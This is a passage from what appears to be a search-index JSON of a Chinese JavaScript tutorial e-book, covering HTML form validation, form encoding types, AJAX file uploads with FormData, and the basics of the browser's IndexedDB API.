(document.getElementById('myInput').validity.rangeOverflow) {\n  txt = '\u6570\u503c\u8d85\u8fc7\u4e0a\u9650';\n}\ndocument.getElementById('prompt').innerHTML = txt;\n</code></pre>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#novalidate","title":"\u8868\u5355\u7684 novalidate \u5c5e\u6027","text":"<p>\u8868\u5355\u5143\u7d20\u7684 HTML \u5c5e\u6027<code>novalidate</code>\uff0c\u53ef\u4ee5\u5173\u95ed\u6d4f\u89c8\u5668\u7684\u81ea\u52a8\u6821\u9a8c\u3002</p> <pre><code>&lt;form novalidate&gt;&lt;/form&gt;\n</code></pre> <p>\u8fd9\u4e2a\u5c5e\u6027\u4e5f\u53ef\u4ee5\u5728\u811a\u672c\u91cc\u8bbe\u7f6e\u3002</p> <pre><code>form.noValidate = true;\n</code></pre> <p>\u5982\u679c\u8868\u5355\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e<code>novalidate</code>\u5c5e\u6027\uff0c\u90a3\u4e48\u63d0\u4ea4\u6309\u94ae\uff08<code>&lt;button&gt;</code>\u6216<code>&lt;input&gt;</code>\u5143\u7d20\uff09\u7684<code>formnovalidate</code>\u5c5e\u6027\u4e5f\u6709\u540c\u6837\u7684\u4f5c\u7528\u3002</p> <pre><code>&lt;form&gt;\n  &lt;input type=\"submit\" value=\"submit\" formnovalidate&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#enctype","title":"enctype \u5c5e\u6027","text":"<p>\u8868\u5355\u80fd\u591f\u7528\u56db\u79cd\u7f16\u7801\uff0c\u5411\u670d\u52a1\u5668\u53d1\u9001\u6570\u636e\u3002\u7f16\u7801\u683c\u5f0f\u7531\u8868\u5355\u7684<code>enctype</code>\u5c5e\u6027\u51b3\u5b9a\u3002</p> <p>\u5047\u5b9a\u8868\u5355\u6709\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662f<code>foo</code>\u548c<code>baz</code>\uff0c\u5176\u4e2d<code>foo</code>\u5b57\u6bb5\u7684\u503c\u7b49\u4e8e<code>bar</code>\uff0c<code>baz</code>\u5b57\u6bb5\u7684\u503c\u662f\u4e00\u4e2a\u5206\u4e3a\u4e24\u884c\u7684\u5b57\u7b26\u4e32\u3002</p> <pre><code>The first line.\nThe second line.\n</code></pre> <p>\u4e0b\u9762\u56db\u79cd\u683c\u5f0f\uff0c\u90fd\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u8868\u5355\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002</p> <p>\uff081\uff09GET \u65b9\u6cd5</p> <p>\u5982\u679c\u8868\u5355\u4f7f\u7528<code>GET</code>\u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c<code>enctype</code>\u5c5e\u6027\u65e0\u6548\u3002</p> <pre><code>&lt;form\n  action=\"register.php\"\n  method=\"get\"\n  onsubmit=\"AJAXSubmit(this); return false;\"\n&gt;\n&lt;/form&gt;\n</code></pre> <p>\u6570\u636e\u5c06\u4ee5 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u53d1\u51fa\u3002</p> <pre><code>?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.\n</code></pre> <p>\uff082\uff09application/x-www-form-urlencoded</p> <p>\u5982\u679c\u8868\u5355\u7528<code>POST</code>\u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c\u5e76\u7701\u7565<code>enctype</code>\u5c5e\u6027\uff0c\u90a3\u4e48\u6570\u636e\u4ee5<code>application/x-www-form-urlencoded</code>\u683c\u5f0f\u53d1\u9001\uff08\u56e0\u4e3a\u8fd9\u662f\u9ed8\u8ba4\u503c\uff09\u3002</p> <pre><code>&lt;form\n  action=\"register.php\"\n  method=\"post\"\n  onsubmit=\"AJAXSubmit(this); return false;\"\n&gt;\n&lt;/form&gt;\n</code></pre> <p>\u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002</p> <pre><code>Content-Type: application/x-www-form-urlencoded\nfoo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u4f53\u91cc\u9762\u7684<code>%0D%0A</code>\u4ee3\u8868\u6362\u884c\u7b26\uff08<code>\\r\\n</code>\uff09\u3002</p> <p>\uff083\uff09text/plain</p> <p>\u5982\u679c\u8868\u5355\u4f7f\u7528<code>POST</code>\u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c<code>enctype</code>\u5c5e\u6027\u4e3a<code>text/plain</code>\uff0c\u90a3\u4e48\u6570\u636e\u5c06\u4ee5\u7eaf\u6587\u672c\u683c\u5f0f\u53d1\u9001\u3002</p> <pre><code>&lt;form\n  action=\"register.php\"\n  method=\"post\"\n  enctype=\"text/plain\"\n  onsubmit=\"AJAXSubmit(this); return false;\"\n&gt;\n&lt;/form&gt;\n</code></pre> <p>\u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002</p> <pre><code>Content-Type: text/plain\n\nfoo=bar\nbaz=The first line.\nThe second line.\n</code></pre> <p>\uff084\uff09multipart/form-data</p> <p>\u5982\u679c\u8868\u5355\u4f7f\u7528<code>POST</code>\u65b9\u6cd5\uff0c<code>enctype</code>\u5c5e\u6027\u4e3a<code>multipart/form-data</code>\uff0c\u90a3\u4e48\u6570\u636e\u5c06\u4ee5\u6df7\u5408\u7684\u683c\u5f0f\u53d1\u9001\u3002</p> <pre><code>&lt;form\n  action=\"register.php\"\n  method=\"post\"\n  enctype=\"multipart/form-data\"\n  onsubmit=\"AJAXSubmit(this); return false;\"\n&gt;\n&lt;/form&gt;\n</code></pre> <p>\u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002</p> <pre><code>Content-Type: multipart/form-data; boundary=\n\nContent-Disposition: form-data; name=\"foo\"\n\nbar\n\nContent-Disposition: form-data; name=\"baz\"\n\nThe first line.\nThe second line.\n</code></pre> <p>\u8fd9\u79cd\u683c\u5f0f\u4e5f\u662f\u6587\u4ef6\u4e0a\u4f20\u7684\u683c\u5f0f\u3002</p>"},{"location":"ebook-JS-basic/10-3-%E8%A1%A8%E5%8D%95/#_3","title":"\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u7528\u6237\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e5f\u662f\u901a\u8fc7\u8868\u5355\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7\u6587\u4ef6\u8f93\u5165\u6846\u9009\u62e9\u672c\u5730\u6587\u4ef6\uff0c\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u6587\u4ef6\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002</p> <pre><code>&lt;input type=\"file\" id=\"file\" name=\"myFile\"&gt;\n</code></pre> <p>\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u5c06\u8868\u5355<code>&lt;form&gt;</code>\u5143\u7d20\u7684<code>method</code>\u5c5e\u6027\u8bbe\u4e3a<code>POST</code>\uff0c<code>enctype</code>\u5c5e\u6027\u8bbe\u4e3a<code>multipart/form-data</code>\u3002\u5176\u4e2d\uff0c<code>enctype</code>\u5c5e\u6027\u51b3\u5b9a\u4e86 HTTP \u5934\u4fe1\u606f\u7684<code>Content-Type</code>\u5b57\u6bb5\u7684\u503c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5b57\u6bb5\u7684\u503c\u662f<code>application/x-www-form-urlencoded</code>\uff0c\u4f46\u662f\u6587\u4ef6\u4e0a\u4f20\u7684\u65f6\u5019\u8981\u6539\u6210<code>multipart/form-data</code>\u3002</p> <pre><code>&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;\n  &lt;div&gt;\n    &lt;label for=\"file\"&gt;\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6&lt;/label&gt;\n    &lt;input type=\"file\" id=\"file\" name=\"myFile\" multiple&gt;\n  &lt;/div&gt;\n  &lt;div&gt;\n    &lt;input type=\"submit\" id=\"submit\" name=\"submit_button\" value=\"\u4e0a\u4f20\" /&gt;\n  &lt;/div&gt;\n&lt;/form&gt;\n</code></pre> <p>\u4e0a\u9762\u7684 HTML \u4ee3\u7801\u4e2d\uff0cfile \u63a7\u4ef6\u7684<code>multiple</code>\u5c5e\u6027\uff0c\u6307\u5b9a\u53ef\u4ee5\u4e00\u6b21\u9009\u62e9\u591a\u4e2a\u6587\u4ef6\uff1b\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5219\u4e00\u6b21\u53ea\u80fd\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\u3002</p> <pre><code>var files = document.getElementById('file').files;\n</code></pre> <p>\u7136\u540e\uff0c\u65b0\u5efa\u4e00\u4e2a FormData \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6a21\u62df\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8868\u5355\u6570\u636e\uff0c\u628a\u9009\u4e2d\u7684\u6587\u4ef6\u6dfb\u52a0\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002</p> <pre><code>var formData = new FormData();\n\nfor (var i = 0; i &lt; files.length; i++) {\n  var file = files[i];\n\n  // \u53ea\u4e0a\u4f20\u56fe\u7247\u6587\u4ef6\n  if (!file.type.match('image.*')) {\n    continue;\n  }\n\n  formData.append('photos[]', file, file.name);\n}\n</code></pre> <p>\u6700\u540e\uff0c\u4f7f\u7528 Ajax \u5411\u670d\u52a1\u5668\u4e0a\u4f20\u6587\u4ef6\u3002</p> <pre><code>var xhr = new XMLHttpRequest();\nxhr.open('POST', 'handler.php', true);\nxhr.onload = function () {\n  if (xhr.status !== 200) {\n    console.log('An error occurred!');\n  }\n};\n\nxhr.send(formData);\n</code></pre> <p>\u9664\u4e86\u53d1\u9001 FormData \u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5 AJAX \u53d1\u9001\u6587\u4ef6\u3002</p> <pre><code>var file = document.getElementById('test-input').files[0];\nvar xhr = new XMLHttpRequest();\n\nxhr.open('POST', 'myserver/uploads');\nxhr.setRequestHeader('Content-Type', file.type);\nxhr.send(file);\n</code></pre>"},{"location":"ebook-JS-basic/10-4-IndexedDB/","title":"10-4-IndexedDB","text":""},{"location":"ebook-JS-basic/10-4-IndexedDB/#bom","title":"\u7b2c\u5341\u7ae0 BOM","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 37417  \u9605\u8bfb75\u5206\u949f</p> <p>2021-11-24 IndexedDB\u5b9e\u9645\u5de5\u4f5c\u4e2d\u6ca1\u7528\u8fc7\uff0c\u9762\u8bd5\u9898\u4e2d\u6ca1\u9047\u5230\u8fc7\uff0c\u7b80\u5355\u8fc7\u4e00\u6b21\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#1014-indexeddb-api","title":"10.14 IndexedDB API","text":""},{"location":"ebook-JS-basic/10-4-IndexedDB/#1indexeddb","title":"1\u3001IndexedDB","text":""},{"location":"ebook-JS-basic/10-4-IndexedDB/#_1","title":"\u51fa\u73b0\u539f\u56e0","text":"<p>\u6570\u636e\u91cf\u589e\u5927\uff0c\u5982\u679c\u6570\u636e\u5b58\u50a8\u5728\u6d4f\u89c8\u5668\uff0c\u90a3\u4e48\u4e0d\u9700\u8981\u4ece\u670d\u52a1\u5668\u53d1\u9001\u5f88\u591a\u4fe1\u606f\uff0c\u76f4\u63a5\u4ece\u672c\u5730\u83b7\u53d6\u4fe1\u606f\u3002\u73b0\u5728\u672c\u5730\u5b58\u50a8\u4e2d\uff0ccookie\u6570\u636e\u91cf\u5f88\u5c0f\uff084k\uff09\uff0c\u6bcf\u6b21\u8bf7\u6c42\u5fc5\u987b\u643a\u5e26cookie\u3002LocalStorage \u6570\u636e\u91cf2.5-10MB\uff0c\u4e0d\u80fd\u641c\u7d22\uff0c\u4e0d\u80fd\u5efa\u7acb\u81ea\u5b9a\u4e49\u7684\u7d22\u5f15\u3002IndexedDB \u7c7b\u4f3c\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u6570\u636e\u5e93\uff0cJS\u811a\u672c\u53ef\u4ee5\u64cd\u4f5c\u6570\u636e\u5e93\uff0c\u4e0d\u5c5e\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff08\u4e0d\u80fd\u7528SQL\u8bed\u8a00\u67e5\u8be2\uff09\uff0c\u5c5e\u4e8eNoSQL\u6570\u636e\u5e93\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#_2","title":"\u7279\u70b9","text":"<ul> <li>\u952e\u503c\u5bf9\u5b58\u50a8\uff0c\u6240\u6709\u7c7b\u578b\u7684\u6570\u636e\uff08\u5305\u62ecJS\u5bf9\u8c61\uff09\u53ef\u4ee5\u8f6c\u5316\u6210\u952e\u503c\u5bf9\uff08\u7c7b\u4f3cJSON\uff1f\uff09\u5b58\u50a8\u3002\u6bcf\u4e00\u6761\u6570\u636e\u8bb0\u5f55\u5bf9\u5e94\u552f\u4e00\u7684\u4e3b\u952e</li> <li>\u5f02\u6b65\uff1a\u6570\u636e\u5e93\u7684\u8bfb\u5199\u548cJS\u811a\u672c\u662f\u5f02\u6b65\u7684\uff0cLocalStorage\u662f\u540c\u6b65\u4efb\u52a1\uff0c\u6240\u4ee5\u64cd\u4f5c\u6570\u636e\u5e93\u4e0d\u4f1a\u963b\u585e\u811a\u672c</li> <li>\u652f\u6301\u4e8b\u52a1 transaction \u5982\u679c\u4e00\u4e2a\u64cd\u4f5c\u51fa\u73b0\u9519\u8bef\uff0c\u90a3\u4e48\u6574\u4e2a\u4e8b\u52a1\u4f1a\u53d6\u6d88\uff0c\u5df2\u4fee\u6539\u7684\u6570\u636e\u4f1a\u590d\u539f\uff0c\u4e0d\u4f1a\u51fa\u73b0\u4fee\u6539\u4e00\u534a\u7684\u6570\u636e</li> <li>\u540c\u6e90\u9650\u5236\uff0c\u6570\u636e\u5e93\u5bf9\u5e94\u5355\u72ec\u7684\u57df\u540d</li> <li>\u5b58\u50a8\u91cf\u5927\uff0c\u4e00\u534a\u5927\u4e8e250MB</li> <li>\u652f\u6301\u4e8c\u8fdb\u5236\u6570\u636e ArrayBuffer \u6216\u8005Blob\u6570\u636e </li> </ul>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#_3","title":"\u5206\u7c7b","text":"<p>IndexDB \u5f88\u590d\u6742\uff0c\u5305\u62ec\u4e0b\u9762\u7684\u5404\u79cd\u5b50\u5bf9\u8c61\u548cAPI\u3002\u6570\u636e\u5e93\u4e2d\u540d\u8bcd\u5bf9\u5e94\u8fd9\u4e2a\u7684\u5bf9\u8c61\u3002</p> <ul> <li>\u6570\u636e\u5e93\uff1aIDB Database \u5bf9\u8c61\uff1a\u6bcf\u4e00\u4e2aURL\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2a\u6570\u636e\u5e93\u3002IDB \u6709\u6570\u636e\u5e93\u7684\u7248\u672c\uff0c\u540c\u4e00\u65f6\u95f4\u5185\u53ea\u80fd\u51fa\u73b0\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u5982\u679c\u4fee\u6539\u6570\u636e\u5e93\u7684\u7ed3\u6784\uff08\u589e\u5220\u6570\u636e\u8868\u3001\u7d22\u5f15\u6216\u8005\u4e3b\u952e\uff09\u53ea\u6709\u5347\u7ea7\u6570\u636e\u5e93\u7684\u7248\u672c\u3002</li> <li>\u5bf9\u8c61\u4ed3\u5e93\uff1aIDB ObjectStore \u5bf9\u8c61\uff1a\u4e00\u4e2a\u6570\u636e\u5e93\u5305\u62ec\u591a\u4e2a\u5bf9\u8c61\u4ed3\u5e93\uff08\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u8868\uff09</li> <li>\u6570\u636e\u8bb0\u5f55\uff1a\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u884c\uff0c\u5305\u62ec\u4e3b\u952e\u548c\u6570\u636e\u4f53\uff0c\u4e3b\u952e\u662f\u9ed8\u8ba4\u7684\u552f\u4e00\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u662f\u8bb0\u5f55\u4e2d\u7684\u4e00\u4e2a\u5c5e\u6027\uff08ID\uff09\uff0c\u6216\u8005\u662f\u4e00\u4e2a\u81ea\u589e\u957f\u7684\u6574\u6570\u7f16\u53f7\u3002\u6570\u636e\u4f53\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u9650\u5236\u3002<code>{ id: 'qo9u', text: 'foo' }</code> \u4f8b\u5982\u8fd9\u4e2a\u6570\u636e\u8bb0\u5f55\u7684\u4e3b\u952e\u662fid\uff0c\u6570\u636e\u4f53\u662ftext\u3002</li> <li>\u7d22\u5f15\uff1a IDB Index \u5bf9\u8c61\uff1a\u4e3a\u4e86\u52a0\u901f\u6570\u636e\u68c0\u7d22\uff0c\u5728\u6570\u636e\u8868\u4e2d\u4e3a\u4e0d\u540c\u7684\u5c5e\u6027\u5efa\u7acb\u7d22\u5f15\u3002</li> <li>\u4e8b\u52a1\uff1a IDB Transaction \u5bf9\u8c61\uff1a\u6570\u636e\u7684\u589e\u5220\u6539\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210</li> <li>\u64cd\u4f5c\u8bf7\u6c42\uff1aIDB Request \u5bf9\u8c61</li> <li>\u6307\u9488\uff1a IDB Cursor \u5bf9\u8c61</li> <li>\u4e3b\u952e\u96c6\u5408\uff1aIDB KeyRange \u5bf9\u8c61</li> </ul>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#2idb","title":"2\u3001IDB \u57fa\u672c\u64cd\u4f5c","text":""},{"location":"ebook-JS-basic/10-4-IndexedDB/#21","title":"2.1 \u6253\u5f00\u6570\u636e\u5e93","text":"<p>\u4f7f\u7528 IndexedDB \u7684\u7b2c\u4e00\u6b65\u662f\u6253\u5f00\u6570\u636e\u5e93\uff0c\u4f7f\u7528<code>indexedDB.open()</code>\u65b9\u6cd5\u3002</p> <pre><code>let request = window.indexedDB.open(dbName, version);\n</code></pre> <p>\u8fd9\u4e2a\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002\u5982\u679c\u6307\u5b9a\u7684\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u65b0\u5efa\u6570\u636e\u5e93\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6574\u6570\uff0c\u8868\u793a\u6570\u636e\u5e93\u7684\u7248\u672c\u3002\u5982\u679c\u7701\u7565\uff0c\u6253\u5f00\u5df2\u6709\u6570\u636e\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7248\u672c\uff1b\u65b0\u5efa\u6570\u636e\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4e3a<code>1</code>\u3002</p> <p><code>indexedDB.open()</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8fd9\u4e2a\u5bf9\u8c61\u901a\u8fc7\u4e09\u79cd\u4e8b\u4ef6<code>error</code>\u3001<code>success</code>\u3001<code>upgradeneeded</code>\uff0c\u5904\u7406\u6253\u5f00\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u7ed3\u679c\u3002</p> <p>\uff081\uff09error \u4e8b\u4ef6</p> <p><code>error</code>\u4e8b\u4ef6\u8868\u793a\u6253\u5f00\u6570\u636e\u5e93\u5931\u8d25\u3002</p> <pre><code>request.onerror = function (event) {\n  console.log('\u6570\u636e\u5e93\u6253\u5f00\u62a5\u9519');\n};\n</code></pre> <p>\uff082\uff09success \u4e8b\u4ef6</p> <p><code>success</code>\u4e8b\u4ef6\u8868\u793a\u6210\u529f\u6253\u5f00\u6570\u636e\u5e93\u3002</p> <pre><code>var db;\nrequest.onsuccess = function (event) {\n  db = request.result;\n  console.log('\u6570\u636e\u5e93\u6253\u5f00\u6210\u529f');\n};\n</code></pre> <p>\u8fd9\u65f6\uff0c\u901a\u8fc7<code>request</code>\u5bf9\u8c61\u7684<code>result</code>\u5c5e\u6027\u62ff\u5230\u6570\u636e\u5e93\u5bf9\u8c61\u3002</p> <p>\uff083\uff09upgradeneeded \u4e8b\u4ef6</p> <p>\u5982\u679c\u6307\u5b9a\u7684\u7248\u672c\u53f7\uff0c\u5927\u4e8e\u6570\u636e\u5e93\u7684\u5b9e\u9645\u7248\u672c\u53f7\uff0c\u5c31\u4f1a\u53d1\u751f\u6570\u636e\u5e93\u5347\u7ea7\u4e8b\u4ef6<code>upgradeneeded</code>\u3002\u8fd9\u65f6\u901a\u8fc7\u4e8b\u4ef6\u5bf9\u8c61\u7684<code>target.result</code>\u5c5e\u6027\uff0c\u62ff\u5230\u6570\u636e\u5e93\u5b9e\u4f8b\u3002</p> <pre><code>var db;\nrequest.onupgradeneeded = function (event) {\n  db = event.target.result;\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#22","title":"2.2 \u65b0\u5efa\u6570\u636e\u5e93","text":"<p>\u65b0\u5efa\u6570\u636e\u5e93\u4e0e\u6253\u5f00\u6570\u636e\u5e93\u662f\u540c\u4e00\u4e2a\u64cd\u4f5c\u3002\u5982\u679c\u6307\u5b9a\u7684\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u65b0\u5efa\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u540e\u7eed\u7684\u64cd\u4f5c\u4e3b\u8981\u5728<code>upgradeneeded</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u5b8c\u6210\uff0c\u56e0\u4e3a\u8fd9\u65f6\u7248\u672c\u4ece\u65e0\u5230\u6709\uff0c\u6240\u4ee5\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002</p> <p>\u901a\u5e38\uff0c\u65b0\u5efa\u6570\u636e\u5e93\u4ee5\u540e\uff0c\u7b2c\u4e00\u4ef6\u4e8b\u662f\u65b0\u5efa\u5bf9\u8c61\u4ed3\u5e93\uff08\u5373\u65b0\u5efa\u8868\uff09\u3002</p> <pre><code>request.onupgradeneeded = function(event) {  \n  db = event.target.result;\n  var objectStore = db.createObjectStore('person', { keyPath: 'id' });\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u5e93\u65b0\u5efa\u6210\u529f\u4ee5\u540e\uff0c\u65b0\u589e\u4e00\u5f20\u53eb\u505a<code>person</code>\u7684\u8868\uff0c\u4e3b\u952e\u662f<code>id</code>\u3002</p> <p>\u66f4\u597d\u7684\u5199\u6cd5\u662f\u5148\u5224\u65ad\u4e00\u4e0b\uff0c\u8fd9\u5f20\u8868\u683c\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u518d\u65b0\u5efa\u3002</p> <pre><code>request.onupgradeneeded = function (event) {\n  db = event.target.result;\n  var objectStore;\n  if (!db.objectStoreNames.contains('person')) {\n    objectStore = db.createObjectStore('person', { keyPath: 'id' });\n  }\n}\n</code></pre> <p>\u4e3b\u952e\uff08key\uff09\u662f\u9ed8\u8ba4\u5efa\u7acb\u7d22\u5f15\u7684\u5c5e\u6027\u3002\u6bd4\u5982\uff0c\u6570\u636e\u8bb0\u5f55\u662f<code>{ id: 1, name: '\u5f20\u4e09' }</code>\uff0c\u90a3\u4e48<code>id</code>\u5c5e\u6027\u53ef\u4ee5\u4f5c\u4e3a\u4e3b\u952e\u3002\u4e3b\u952e\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e0b\u4e00\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6bd4\u5982<code>{ foo: { bar: 'baz' } }</code>\u7684<code>foo.bar</code>\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e3b\u952e\u3002</p> <p>\u5982\u679c\u6570\u636e\u8bb0\u5f55\u91cc\u9762\u6ca1\u6709\u5408\u9002\u4f5c\u4e3a\u4e3b\u952e\u7684\u5c5e\u6027\uff0c\u90a3\u4e48\u53ef\u4ee5\u8ba9 IndexedDB \u81ea\u52a8\u751f\u6210\u4e3b\u952e\uff08\u81ea\u589e\u957f\uff09\u3002</p> <pre><code>var objectStore = db.createObjectStore('person', { autoIncrement: true });\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6307\u5b9a\u4e3b\u952e\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6574\u6570\u3002</p> <p>\u65b0\u5efa\u5bf9\u8c61\u4ed3\u5e93\u4ee5\u540e\uff0c\u4e0b\u4e00\u6b65\u53ef\u4ee5\u65b0\u5efa\u7d22\u5f15\u3002</p> <pre><code>request.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore('person', { keyPath: 'id' });\n  objectStore.createIndex('name', 'name', { unique: false });\n  objectStore.createIndex('email', 'email', { unique: true });\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>IDBObject.createIndex()</code>\u7684\u4e09\u4e2a\u53c2\u6570\u5206\u522b\u4e3a\u7d22\u5f15\u540d\u79f0\u3001\u7d22\u5f15\u6240\u5728\u7684\u5c5e\u6027\u3001\u914d\u7f6e\u5bf9\u8c61\uff08\u8bf4\u660e\u8be5\u5c5e\u6027\u662f\u5426\u5305\u542b\u91cd\u590d\u7684\u503c\uff09\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#23","title":"2.3 \u65b0\u589e\u6570\u636e","text":"<p>\u65b0\u589e\u6570\u636e\u6307\u7684\u662f\u5411\u5bf9\u8c61\u4ed3\u5e93\u5199\u5165\u6570\u636e\u8bb0\u5f55\u3002\u8fd9\u9700\u8981\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002</p> <pre><code>function add() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .add({ id: 1, name: '\u5f20\u4e09', age: 24, email: 'zhangsan@example.com' });\n\n  request.onsuccess = function (event) {\n    console.log('\u6570\u636e\u5199\u5165\u6210\u529f');\n  };\n\n  request.onerror = function (event) {\n    console.log('\u6570\u636e\u5199\u5165\u5931\u8d25');\n  }\n}\n\nadd();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u5165\u6570\u636e\u9700\u8981\u65b0\u5efa\u4e00\u4e2a\u4e8b\u52a1\u3002\u65b0\u5efa\u65f6\u5fc5\u987b\u6307\u5b9a\u8868\u683c\u540d\u79f0\u548c\u64cd\u4f5c\u6a21\u5f0f\uff08\u201c\u53ea\u8bfb\u201d\u6216\u201c\u8bfb\u5199\u201d\uff09\u3002\u65b0\u5efa\u4e8b\u52a1\u4ee5\u540e\uff0c\u901a\u8fc7<code>IDBTransaction.objectStore(name)</code>\u65b9\u6cd5\uff0c\u62ff\u5230 IDBObjectStore \u5bf9\u8c61\uff0c\u518d\u901a\u8fc7\u8868\u683c\u5bf9\u8c61\u7684<code>add()</code>\u65b9\u6cd5\uff0c\u5411\u8868\u683c\u5199\u5165\u4e00\u6761\u8bb0\u5f55\u3002</p> <p>\u5199\u5165\u64cd\u4f5c\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7\u76d1\u542c\u8fde\u63a5\u5bf9\u8c61\u7684<code>success</code>\u4e8b\u4ef6\u548c<code>error</code>\u4e8b\u4ef6\uff0c\u4e86\u89e3\u662f\u5426\u5199\u5165\u6210\u529f\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#24","title":"2.4 \u8bfb\u53d6\u6570\u636e","text":"<p>\u8bfb\u53d6\u6570\u636e\u4e5f\u662f\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002</p> <pre><code>function read() {\n   var transaction = db.transaction(['person']);\n   var objectStore = transaction.objectStore('person');\n   var request = objectStore.get(1);\n\n   request.onerror = function(event) {\n     console.log('\u4e8b\u52a1\u5931\u8d25');\n   };\n\n   request.onsuccess = function(event) {\n      if (request.result) {\n        console.log('Name: ' + request.result.name);\n        console.log('Age: ' + request.result.age);\n        console.log('Email: ' + request.result.email);\n      } else {\n        console.log('\u672a\u83b7\u5f97\u6570\u636e\u8bb0\u5f55');\n      }\n   };\n}\n\nread();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>objectStore.get()</code>\u65b9\u6cd5\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\uff0c\u53c2\u6570\u662f\u4e3b\u952e\u7684\u503c\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#25","title":"2.5 \u904d\u5386\u6570\u636e","text":"<p>\u904d\u5386\u6570\u636e\u8868\u683c\u7684\u6240\u6709\u8bb0\u5f55\uff0c\u8981\u4f7f\u7528\u6307\u9488\u5bf9\u8c61 IDBCursor\u3002</p> <pre><code>function readAll() {\n  var objectStore = db.transaction('person').objectStore('person');\n\n  objectStore.openCursor().onsuccess = function (event) {\n    var cursor = event.target.result;\n    if (cursor) {\n      console.log('Id: ' + cursor.key);\n      